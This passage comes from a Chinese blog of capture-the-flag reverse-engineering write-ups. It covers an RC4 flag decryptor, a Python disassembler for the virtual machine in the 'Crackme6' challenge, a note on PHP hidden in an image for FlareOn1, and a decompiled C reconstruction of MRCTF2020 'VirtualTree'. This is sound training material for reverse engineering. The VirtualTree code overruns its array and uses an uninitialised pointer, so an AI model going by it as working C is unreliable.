class="keyword">char</span> tmp = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;<span class="number">256</span>;i++) &#123;</span><br><span class="line">        s[i] = i;</span><br><span class="line">        k[i] = key[i%Len];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;<span class="number">256</span>; i++) &#123;</span><br><span class="line">        j=(j+s[i]+k[i])%<span class="number">256</span>;</span><br><span class="line">        tmp = s[i];</span><br><span class="line">        s[i] = s[j]; <span class="comment">//交换s[i]和s[j]</span></span><br><span class="line">        s[j] = tmp;</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rc4_crypt</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> *s, <span class="keyword">unsigned</span> <span class="keyword">char</span> *Data, <span class="keyword">unsigned</span> <span class="keyword">long</span> Len)</span> <span class="comment">//加解密</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>, t = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> k = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> tmp;</span><br><span class="line">    <span class="keyword">for</span>(k=<span class="number">0</span>;k&lt;Len;k++) &#123;</span><br><span class="line">        i=(i+<span class="number">1</span>)%<span class="number">256</span>;</span><br><span class="line">        j=(j+s[i])%<span class="number">256</span>;</span><br><span class="line">        tmp = s[i];</span><br><span class="line">        s[i] = s[j]; <span class="comment">//交换s[x]和s[y]</span></span><br><span class="line">        s[j] = tmp;</span><br><span class="line">        t=(s[i]+s[j])%<span class="number">256</span>;</span><br><span class="line">        Data[k] ^= s[t];</span><br><span class="line">     &#125;</span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">uint8_t</span> key[<span class="number">5</span>];</span><br><span class="line">    key[<span class="number">0</span>] = <span class="number">71</span>;</span><br><span class="line">    key[<span class="number">1</span>] = <span class="number">75</span>;</span><br><span class="line">    key[<span class="number">2</span>] = <span class="number">67</span>;</span><br><span class="line">    key[<span class="number">3</span>] = <span class="number">84</span>;</span><br><span class="line">    key[<span class="number">4</span>] = <span class="number">70</span>;</span><br><span class="line">    <span class="keyword">uint8_t</span> sbox[<span class="number">256</span>];</span><br><span class="line">    <span class="keyword">uint8_t</span> data[] = &#123;<span class="number">0x2d</span>, <span class="number">0xd4</span>, <span class="number">0xf</span>, <span class="number">0xd0</span>, <span class="number">0x54</span>, <span class="number">0xee</span>, <span class="number">0x75</span>, <span class="number">0xd0</span>, <span class="number">0xe0</span>, <span class="number">0x30</span>, <span class="number">0x96</span>, <span class="number">0xe1</span>, <span class="number">0x79</span>, <span class="number">0x8a</span>, <span class="number">0xe0</span>, <span class="number">0xfe</span>, <span class="number">0x18</span>, <span class="number">0x3a</span>, <span class="number">0x27</span>, <span class="number">0xe7</span>, <span class="number">0x2f</span>, <span class="number">0x86</span>, <span class="number">0xc9</span>, <span class="number">0xfe</span>, <span class="number">0x66</span>, <span class="number">0x43</span>, <span class="number">0xa7</span>, <span class="number">0x75</span>&#125;;</span><br><span class="line">    rc4_init(sbox,key,<span class="keyword">sizeof</span>(key));</span><br><span class="line">    rc4_crypt(sbox,data,<span class="keyword">sizeof</span>(data));</span><br><span class="line">    <span class="keyword">char</span> f[] = <span class="string">&quot;flag&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;<span class="keyword">sizeof</span>(data);i++)&#123;</span><br><span class="line">        data[i]-=<span class="number">128</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,data[i]^f[i%<span class="number">4</span>]);</span><br><span class="line">        data[i]^=<span class="number">73</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    printArray(<span class="string">&quot;flag&quot;</span>,data,<span class="keyword">sizeof</span>(data));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,data);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><del>看答案发现动调和非动调情况下比对数据完全不同，应该是哪里做了手jio</del></p>
<p>就在上面，我瞎了</p>
<h2 id="rev-Crackme6"><a href="#rev-Crackme6" class="headerlink" title="[rev]Crackme6"></a>[rev]Crackme6</h2><ol>
<li>先检查pediy2016</li>
<li>长度为0x14</li>
<li>写反汇编jio本</li>
<li>先是一些常量计算</li>
<li>接下来三个 水仙花数</li>
<li>接下来是一个二元一次方程，解得1223</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">from z3 import *</span><br><span class="line"></span><br><span class="line">opc &#x3D; [1, 0, 2, 0, 3, 0, 150, 0, 32, 33, 10, 0, 41, 1, 43, 1, 39, 246, 255, 129, 20, 33, 4, 0, 0, 1, 46, 18, 0, 128, 1, 99, 2, 9, 139, 0, 32, 33, 4, 0, 0, 1, 111, 42, 1, 139, 0, 32, 33, 4, 0, 0, 42, 1, 139, 0, 32, 33, 4, 0, 0, 1, 108, 42, 1, 139, 0, 32, 33, </span><br><span class="line">4, 0, 0, 1, 46, 3, 1, 20, 0, 128, 1, 49, 42, 1, 139, 0, 32, 33, 4, 0, 0, 11, 0, 32, </span><br><span class="line">41, 208, 8, 69, 69, 27, 42, 1, 11, 0, 32, 41, 208, 8, 69, 69, 27, 42, 1, 11, 0, 32, </span><br><span class="line">41, 208, 8, 69, 69, 29, 45, 29, 45, 27, 2, 13, 11, 0, 32, 41, 208, 65, 100, 42, 1, 17, 0, 32, 43, 208, 67, 10, 45, 42, 1, 17, 0, 32, 43, 208, 45, 29, 133, 33, 4, 0, 0, </span><br><span class="line">1, 46, 3, 2, 20, 0, 128, 42, 1, 11, 0, 32, 41, 208, 65, 10, 42, 1, 17, 0, 32, 43, 208, 45, 27, 42, 1, 17, 0, 32, 43, 208, 67, 10, 42, 1, 11, 0, 32, 41, 208, 48, 30, 4, </span><br><span class="line">45, 66, 4, 67, 2, 47, 129, 35, 38, 18, 0, 130, 94, 38, 13, 0, 1, 46, 3, 3, 20, 0, 128, 39, 4, 0, 0, 2, 0, 1, 0, 3, 46, 152, 0, 128, 38, 5, 0, 41, 1, 42, 1, 130, 4, 38, </span><br><span class="line">244, 255, 129, 4, 38, 4, 0, 153, 0]</span><br><span class="line"></span><br><span class="line">locs &#x3D; [4203214, 4202753, 4202797, 4202842, 4202887, 4202903, 4202919, 4202935, 4202952, 4202968, 4202985, 4203054, 4203134, -1, 4203219, 4203289, 4203370, 4203440, 4203521, 4203590, 4203670, 4203750, 4203820, 4203901, 4203971, 4204052, 4204093, 4204133, 4204173, 4204254, 4204213, 4204294, 4204335, 4204453, -1, -1, -1, -1, 4204558, 4204376, 4204448, 4204663, 4204712, 4204763, 4204814, 4204835, 4204856, 4204878, 4204901, 4204923, 4204946, 4205020, 4205105, 4205190, 4205266, 4205353, 4205429, 4205516, 4205603, 4205712, 4205821, 4205909, 4206019, 4206107, -1, 4206217, 4206266, 4206319, 4206372, 4206393, 4206414, 4206436, 4206459, 4206481, 4206504, 4206578, 4206665, -1, 4206752, 4206830, 4206919, 4206997, 4207086, 4207173, 4207282, 4207391, 4207479, 4207589, 4207677, -1, -1, -1, -1, -1, -1, -1, -1, 4207787, 4207836, 4207887, 4207938, 4207959, 4207980, 4208002, 4208025, 4208047, 4208070, 4208144, 4208229, -1, 4208314, 4208390, 4208477, 4208553, 4208640, 4208727, 4208836, 4208945, 4209033, 4209143, 4209231, -1, -1, -1, -1, -1, -1, -1, -1, 4209341, 4209428, 4209516, 4209604, 4209638, 4209672, 4209706, 4209741, 4209775, 4209810, 4209896, 4209993, -1, 4210090, 4210177, 4210275, 4210362, 4210460, 4210546, 4210643, 4210740, 4210827, 4210925, 4211012, 4211107]</span><br><span class="line">eip &#x3D; 0</span><br><span class="line"></span><br><span class="line">cpu &#x3D; [0,0,0,0]</span><br><span class="line">tmp&#x3D;0</span><br><span class="line"># vm_dh是flag</span><br><span class="line"># tmp&#x3D;0x2000的话是input</span><br><span class="line">while eip&lt;len(opc):</span><br><span class="line">    s&#x3D;&#39;&#39;</span><br><span class="line">    op &#x3D; opc[eip]</span><br><span class="line">    op1&#x3D;0</span><br><span class="line">    op2&#x3D;0</span><br><span class="line">    op3&#x3D;0</span><br><span class="line">    if eip+1&lt;len(opc):</span><br><span class="line">        op1 &#x3D; opc[eip+1]</span><br><span class="line">    if eip+2&lt;len(opc):</span><br><span class="line">        op2 &#x3D; opc[eip+2]</span><br><span class="line">    if eip+3&lt;len(opc):</span><br><span class="line">        op3 &#x3D; opc[eip+3]</span><br><span class="line">    tmp&#x3D;op1+op2*16</span><br><span class="line">    if op&gt;153:</span><br><span class="line">        break</span><br><span class="line">    loc &#x3D; locs[op]</span><br><span class="line">    print(&#39;%02x:%03X:%x:&#39;%(eip,op,loc),end&#x3D;&quot;&quot;)</span><br><span class="line">    if op&#x3D;&#x3D;0x0:</span><br><span class="line">        s&#x3D;&#39;exit\n&#39;</span><br><span class="line">        eip+&#x3D;1</span><br><span class="line">    elif op&#x3D;&#x3D;0x1:</span><br><span class="line">        s&#x3D;&#39;mov vm_al,%d&#39;%(op1)</span><br><span class="line">        eip+&#x3D;2</span><br><span class="line">    elif op&#x3D;&#x3D;0x2:</span><br><span class="line">        s&#x3D;&#39;mov vm_ah,%d&#39;%(op1)</span><br><span class="line">        eip+&#x3D;2</span><br><span class="line">    elif op&#x3D;&#x3D;0x3:</span><br><span class="line">        s&#x3D;&#39;mov vm_bl,%d&#39;%(op1)</span><br><span class="line">        eip+&#x3D;2</span><br><span class="line">    elif op&#x3D;&#x3D;0x04:</span><br><span class="line">        s&#x3D;&#39;mov vm_al,vm_ah&#39;</span><br><span class="line">        eip+&#x3D;1</span><br><span class="line">    elif op&#x3D;&#x3D;0x08:</span><br><span class="line">        s&#x3D;&#39;mov vm_bl,vm_al&#39;</span><br><span class="line">        eip+&#x3D;1</span><br><span class="line">    elif op&#x3D;&#x3D;0x0b:</span><br><span class="line">        s&#x3D;&#39;mov vm_al,[vm_ip+%xh+vm_ah]&#39;%(tmp)</span><br><span class="line">        eip+&#x3D;3</span><br><span class="line">    elif op&#x3D;&#x3D;0x11:</span><br><span class="line">        s&#x3D;&#39;mov vm_bl,[vm_ip+%xh+vm_ah]&#39;%(tmp)</span><br><span class="line">        eip+&#x3D;3</span><br><span class="line">    elif op&#x3D;&#x3D;0x12:</span><br><span class="line">        s&#x3D;&#39;mov [%xh+vm_ip],vm_al&#39;%(tmp)</span><br><span class="line">        eip+&#x3D;3</span><br><span class="line">    elif op&#x3D;&#x3D;0x14:</span><br><span class="line">        s&#x3D;&#39;mov [vm_ip+%xh+vm_ah],vm_al&#39;%(tmp)</span><br><span class="line">        eip+&#x3D;3</span><br><span class="line">    elif op&#x3D;&#x3D;0x1b:</span><br><span class="line">        s&#x3D;&#39;push vm_al&#39;</span><br><span class="line">        eip+&#x3D;1</span><br><span class="line">    elif op&#x3D;&#x3D;0x1e:</span><br><span class="line">        s&#x3D;&#39;pop vm_ah&#39;</span><br><span class="line">        eip+&#x3D;1</span><br><span class="line">    elif op&#x3D;&#x3D;0x1d:</span><br><span class="line">        s&#x3D;&#39;pop vm_bl&#39;</span><br><span class="line">        eip+&#x3D;1</span><br><span class="line">    elif op&#x3D;&#x3D;0x21:</span><br><span class="line">        to &#x3D; tmp&amp;0xff</span><br><span class="line">        if to&gt;0x7f:</span><br><span class="line">            to-&#x3D;0x100</span><br><span class="line">        s&#x3D;&#39;jz %xh&#39;%(to+eip)</span><br><span class="line">        eip+&#x3D;3</span><br><span class="line">    elif op&#x3D;&#x3D;0x26:</span><br><span class="line">        to &#x3D; tmp&amp;0xff</span><br><span class="line">        if to&gt;0x7f:</span><br><span class="line">            to-&#x3D;0x100</span><br><span class="line">        s&#x3D;&#39;jnz %xh&#39;%(to+eip)</span><br><span class="line">        eip+&#x3D;3</span><br><span class="line">    elif op&#x3D;&#x3D;0x27:</span><br><span class="line">        to &#x3D; tmp&amp;0xff</span><br><span class="line">        if to&gt;0x7f:</span><br><span class="line">            to-&#x3D;0x100</span><br><span class="line">        s&#x3D;&#39;jmp %xh&#39;%(to+eip)</span><br><span class="line">        eip+&#x3D;3</span><br><span class="line">    elif op&#x3D;&#x3D;0x29:</span><br><span class="line">        s&#x3D;&#39;add vm_al,%d&#39;%(op1)</span><br><span class="line">        eip+&#x3D;2</span><br><span class="line">    elif op&#x3D;&#x3D;0x2a:</span><br><span class="line">        s&#x3D;&#39;add vm_ah,%d&#39;%(op1)</span><br><span class="line">        eip+&#x3D;2</span><br><span class="line">    elif op&#x3D;&#x3D;0x2b:</span><br><span class="line">        s&#x3D;&#39;add vm_bl,%d&#39;%(op1)</span><br><span class="line">        eip+&#x3D;2</span><br><span class="line">    elif op&#x3D;&#x3D;0x2f:</span><br><span class="line">        s&#x3D;&#39;add vm_ah,vm_bl&#39;</span><br><span class="line">        eip+&#x3D;1</span><br><span class="line">    elif op&#x3D;&#x3D;0x30:</span><br><span class="line">        s&#x3D;&#39;add vm_bl,vm_al&#39;</span><br><span class="line">        eip+&#x3D;1</span><br><span class="line">    elif op&#x3D;&#x3D;0x2d:</span><br><span class="line">        s&#x3D;&#39;add vm_al,vm_bl&#39;</span><br><span class="line">        eip+&#x3D;1</span><br><span class="line">    elif op&#x3D;&#x3D;0x41:</span><br><span class="line">        s&#x3D;&#39;mul vm_al,%d&#39;%(op1)</span><br><span class="line">        eip+&#x3D;2</span><br><span class="line">    elif op&#x3D;&#x3D;0x42:</span><br><span class="line">        s&#x3D;&#39;mul vm_ah,%d&#39;%(op1)</span><br><span class="line">        eip+&#x3D;2</span><br><span class="line">    elif op&#x3D;&#x3D;0x43:</span><br><span class="line">        s&#x3D;&#39;mul vm_bl,%d&#39;%(op1)</span><br><span class="line">        eip+&#x3D;2</span><br><span class="line">    elif op&#x3D;&#x3D;0x45:</span><br><span class="line">        s&#x3D;&#39;mul vm_al,vm_bl&#39;</span><br><span class="line">        eip+&#x3D;1</span><br><span class="line">    elif op&#x3D;&#x3D;0x81:</span><br><span class="line">        s&#x3D;&#39;test vm_al,%d&#39;%(op1)</span><br><span class="line">        eip+&#x3D;2</span><br><span class="line">    elif op&#x3D;&#x3D;0x82:</span><br><span class="line">        s&#x3D;&#39;test vm_ah,%d&#39;%(op1)</span><br><span class="line">        eip+&#x3D;2</span><br><span class="line">    elif op&#x3D;&#x3D;0x85:</span><br><span class="line">        s&#x3D;&#39;test vm_al,vm_bl&#39;</span><br><span class="line">        eip+&#x3D;1</span><br><span class="line">    elif op&#x3D;&#x3D;0x8b:</span><br><span class="line">        s&#x3D;&#39;test vm_al,[vm_ip+%xh+vm_ah]&#39;%(tmp)</span><br><span class="line">        eip+&#x3D;3</span><br><span class="line">    elif op&#x3D;&#x3D;0x96:</span><br><span class="line">        s&#x3D;&#39;test vm_ah,[vm_ip+%xh+vm_bl]&#39;%(tmp)</span><br><span class="line">        eip+&#x3D;3</span><br><span class="line">    elif op&#x3D;&#x3D;0x98:</span><br><span class="line">        s&#x3D;&#39;test vm_bl,[vm_ip+%xh+vm_ah]&#39;%(tmp)</span><br><span class="line">        eip+&#x3D;3</span><br><span class="line">    elif op&#x3D;&#x3D;0x99:</span><br><span class="line">        s&#x3D;&#39;success&#39;</span><br><span class="line">        eip+&#x3D;1</span><br><span class="line">    else:</span><br><span class="line">        s&#x3D;&#39;nop&#39;</span><br><span class="line">        eip+&#x3D;1</span><br><span class="line">    print(s)</span><br></pre></td></tr></table></figure>

<h2 id="rev-FlareOn1-Javascrap"><a href="#rev-FlareOn1-Javascrap" class="headerlink" title="[rev][FlareOn1]Javascrap"></a>[rev][FlareOn1]Javascrap</h2><p>看html看了大半天，原来猫腻在图片中</p>
<p>二进制打开图片，最后有一段php代码，然后无限base64套娃就解出来了</p>
<h2 id="rev-MRCTF2020-VirtualTree"><a href="#rev-MRCTF2020-VirtualTree" class="headerlink" title="[rev][MRCTF2020]VirtualTree"></a>[rev][MRCTF2020]VirtualTree</h2><p>被骗了555</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;setjmp.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span>&#123;</span></span><br><span class="line">    <span class="keyword">int8_t</span> data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span>*<span class="title">left</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span>*<span class="title">right</span>;</span></span><br><span class="line">&#125; TreeNode;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printArray</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *name, <span class="keyword">uint8_t</span> *v, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;========%s=========\n&quot;</span>, name);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; len; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x%02X,&quot;</span>, v[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n=================\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="keyword">int</span> <span class="title">sub_401120</span><span class="params">(TreeNode**treeHead)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  TreeNode *v1[<span class="number">15</span>]; <span class="comment">// [esp+0h] [ebp-48h]</span></span><br><span class="line">  TreeNode *v2; <span class="comment">// [esp+3Ch] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+40h] [ebp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> j; <span class="comment">// [esp+44h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">16</span>; ++i )</span><br><span class="line">    v1[i] = (TreeNode *)<span class="built_in">malloc</span>(<span class="number">12</span>);</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">16</span>; ++j )&#123;</span><br><span class="line">    v1[j]-&gt;data = j + <span class="number">65</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v1[<span class="number">0</span>]-&gt;right = v1[<span class="number">1</span>];</span><br><span class="line">  v1[<span class="number">0</span>]-&gt;left = v1[<span class="number">2</span>];</span><br><span class="line">  v1[<span class="number">1</span>]-&gt;right = v1[<span class="number">3</span>];</span><br><span class="line">  v1[<span class="number">1</span>]-&gt;left = v1[<span class="number">4</span>];</span><br><span class="line">  v1[<span class="number">2</span>]-&gt;right = v1[<span class="number">5</span>];</span><br><span class="line">  v1[<span class="number">2</span>]-&gt;left = v1[<span class="number">6</span>];</span><br><span class="line">  v1[<span class="number">3</span>]-&gt;right = v1[<span class="number">7</span>];</span><br><span class="line">  v1[<span class="number">3</span>]-&gt;left = v1[<span class="number">8</span>];</span><br><span class="line">  v1[<span class="number">4</span>]-&gt;right = v1[<span class="number">9</span>];</span><br><span class="line">  v1[<span class="number">4</span>]-&gt;left = <span class="number">0</span>;</span><br><span class="line">  v1[<span class="number">5</span>]-&gt;right = v1[<span class="number">10</span>];</span><br><span class="line">  v1[<span class="number">5</span>]-&gt;left = <span class="number">0</span>;</span><br><span class="line">  v1[<span class="number">6</span>]-&gt;right = v1[<span class="number">11</span>];</span><br><span class="line">  v1[<span class="number">6</span>]-&gt;left = v1[<span class="number">12</span>];</span><br><span class="line">  v1[<span class="number">7</span>]-&gt;right = <span class="number">0</span>;</span><br><span class="line">  v1[<span class="number">7</span>]-&gt;left = <span class="number">0</span>;</span><br><span class="line">  v1[<span class="number">8</span>]-&gt;right = <span class="number">0</span>;</span><br><span class="line">  v1[<span class="number">8</span>]-&gt;left = v1[<span class="number">13</span>];</span><br><span class="line">  v1[<span class="number">9</span>]-&gt;left = <span class="number">0</span>;</span><br><span class="line">  v1[<span class="number">9</span>]-&gt;right = <span class="number">0</span>;</span><br><span class="line">  v1[<span class="number">10</span>]-&gt;right = v1[<span class="number">14</span>];</span><br><span class="line">  v1[<span class="number">10</span>]-&gt;left = v2;</span><br><span class="line">  v1[<span class="number">12</span>]-&gt;left = <span class="number">0</span>;</span><br><span class="line">  v1[<span class="number">12</span>]-&gt;right = <span class="number">0</span>;</span><br><span class="line">  v1[<span class="number">11</span>]-&gt;left = <span class="number">0</span>;</span><br><span class="line">  v1[<span class="number">11</span>]-&gt;right = <span class="number">0</span>;</span><br><span class="line">  v1[<span class="number">13</span>]-&gt;left = <span class="number">0</span>;</span><br><span class="line">  v1[<span class="number">13</span>]-&gt;right = <span class="number">0</span>;</span><br><span class="line">  v2-&gt;left = <span class="number">0</span>;</span><br><span class="line">  v2-&gt;right = <span class="number">0</span>;</span><br><span class="line">  v1[<span class="number">14</span>]-&gt;left = <span class="number">0</span>;</span><br><span class="line">  v1[<span class="number">14</span>]-&gt;right = <span class="number">0</span>;</span><br><span class="line">  *treeHead = v1[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">postTraverse</span><span class="params">(TreeNode*head)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(head)&#123;</span><br><span class="line">        postTraverse(head-&gt;left);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(head)&#123;</span><br><span class="line">        postTraverse(head-&gt;right);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(head)<span 